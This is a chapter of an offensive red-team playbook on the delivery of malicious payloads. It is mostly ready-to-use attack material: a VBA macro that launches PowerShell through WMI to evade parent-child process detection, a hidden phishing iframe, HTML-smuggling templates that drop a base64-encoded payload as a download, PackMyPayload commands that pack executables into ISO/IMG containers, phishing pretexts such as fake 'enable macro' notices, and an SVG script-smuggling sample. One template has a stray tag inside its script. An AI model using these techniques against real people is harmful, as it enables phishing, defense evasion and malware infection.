# 3 Delivery

## Table of Contents

- [Tooling](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/3-Delivery/3-Delivery.md#tooling)
- [Breack Microsoft Word Parent-Child Relationship](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/3-Delivery/3-Delivery.md#Break-Microsoft-Word-Parent-Child-Relationship)
- [Embedding hidden iFrame in Phishing Page](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/3-Delivery/3-Delivery.md#Embedding-hidden-iFrame-in-Phishing-Page)
- [HTML Smuggling](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/3-Delivery/3-Delivery.md#HTML-Smuggling)
- [PackMyPayload](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/3-Delivery/3-Delivery.md#PackMyPayload)
- [Phishing Scenarios](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/3-Delivery/3-Delivery.md#Phishing-Scenarios)
- [SVG Smuggling](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/3-Delivery/3-Delivery.md#SVG-Smuggling)

## Tooling

| Name | Description | URL |
| --- | --- | --- |
| The Social-Engineer Toolkit (SET) | The Social-Engineer Toolkit (SET) repository from TrustedSec | https://github.com/trustedsec/social-engineer-toolkit |

## Break Microsoft Word Parent-Child Releationship

```vb
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell"
```

## Embedding hidden iFrame in Phishing Page

```HTML
<iframe src="<URL>" width="0" height="0" frameborder="0" tabindex="-1" title="empty" style=visibility:hidden;display:none"> </iframe>
```

## HTML Smuggling

```html
<html>
    <head>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/brands.min.css">
    </head>
    <body>
        <button class="btn" onclick="downloadFile()"><i class="fa fa-download"></i> Download</button>

        <script>
            function convertFromBase64(base64) {
                let binary_string = window.atob(base64);
                let len = binary_string.length;
                let bytes = new Uint8Array(len);
                for (let i = 0; i < len; i++) {
                    bytes[i] = binary_string.charCodeAt(i);
                }
                return bytes.buffer;
            }

            function downloadFile() {
                const file = '<BASE64>';
                const fileName = '<FILE>';
                let data = convertFromBase64(file);
                let blob = new Blob([data], {type: 'octet/stream'});
                if (window.navigator.msSaveOrOpenBlob) {
                    window.navigator.msSaveBlob(blob,fileName);
                }
                else {
                    const a = document.createElement('a');
                    document.body.appendChild(a);
                    a.style = 'display: none';
                    const url = window.URL.createObjectURL(blob);
                    a.href = url;
                    a.download = fileName;
                    a.click();
                    window.URL.revokeObjectURL(url);
                }
            }
        </script>
    </body>
</html>
```

## PackMyPayload

> https://github.com/mgeeky/PackMyPayload

### Create ISO File

```console
$ python3 PackMyPayload.py /PATH/TO/FILE/<FILE>.exe /PATH/TO/FILE/<FILE>.iso
```

### Hide Files in Container

```console
$ python3 PackMyPayload.py -H <FILE>.xlsx,<FILE>.xlam /PATH/TO/FILES/ /PATH/TO/FILE/<FILE>.img
```

### Container Phishing Template

```html
<script>
    function convertFromBase64(base64) {
        let binary_string = window.atob(base64);
        let len = binary_string.length;
        let bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes.buffer;
    }

    function downloadFile() {
        const file = '<BASE64>';
        const fileName = '<FILE>.img';
        let data = convertFromBase64(file);
        let blob = new Blob([data], {type: 'octet/stream'});
        if (window.navigator.msSaveOrOpenBlob) {
            window.navigator.msSaveBlob(blob,fileName);
        }
        else {
            const a = document.createElement('a');
            document.body.appendChild(a);
            a.style = 'display: none';
            const url = window.URL.createObjectURL(blob);
            <a onclick="downloadFile()" style="text-decoration: none;">
            a.download = fileName;
            a.click();
            window.URL.revokeObjectURL(url);
        }
    }
</script>
```

## Phishing Scenarios

- `Bitwarden send link` abuse
- `Broken image` - please click to reload
- `GDPR Macro` - please enable macro to see the document content

## SVG Smuggling

```js
<svg width="100" height="100" xmlns="http://www.w3.org/2000/svg">
<circle cx="50" cy="50" r="40" stroke="black" stroke-width="4" fill="none" />
<script>
    alert('pwnd');
</script>
Sorry, your browser does not support inline SVG.
</svg> 
```

### Previous

- [2 Weaponization](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/2-Weaponization/2-Weaponization.md)
- [2.1 Initial Access](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/2-Weaponization/2.1-Initial-Access.md)

### Next

- [4 Exploitation](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/4-Exploitation/4-Exploitation.md)
- [4.1 Defense Evasion](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/4-Exploitation/4.1-Defense-Evasion.md)
- [4.2 Credential Dumping](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/4-Exploitation/4.2-Credential-Dumping.md)
- [4.3 Privilege Escalation](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/4-Exploitation/4.3-Privilege-Escalation.md)
- [4.4 Lateral Movement](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/4-Exploitation/4.4-Lateral-Movement.md)
